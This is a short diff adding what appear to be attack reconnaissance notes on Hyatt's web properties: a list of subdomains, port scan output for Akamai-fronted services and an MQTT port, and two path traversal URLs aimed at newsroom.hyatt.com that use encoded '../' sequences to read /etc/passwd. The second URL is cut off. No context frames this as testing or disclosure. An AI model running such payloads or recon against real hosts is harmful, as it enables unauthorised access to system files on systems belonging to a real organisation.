@@ -1,0 +1,17 @@
+https://mobileapp.hyatt.com/
+https://roominglist.hyatt.com/
+https://e.hyatt.com
+https://f.e.hyatt.com
+https://hrsac-mc.hyatt.com/
+uca.hyatt.com
+
+
+PORT     STATE SERVICE          VERSION
+80/tcp   open  http             AkamaiGHost (Akamai's HTTP Acceleration/Mirror service)
+443/tcp  open  ssl/http         AkamaiGHost (Akamai's HTTP Acceleration/Mirror service)
+8883/tcp open  ssl/secure-mqtt?
+
+
+path traversal
+https://newsroom.hyatt.com/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
+https://newsroom.hyatt.com/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passw
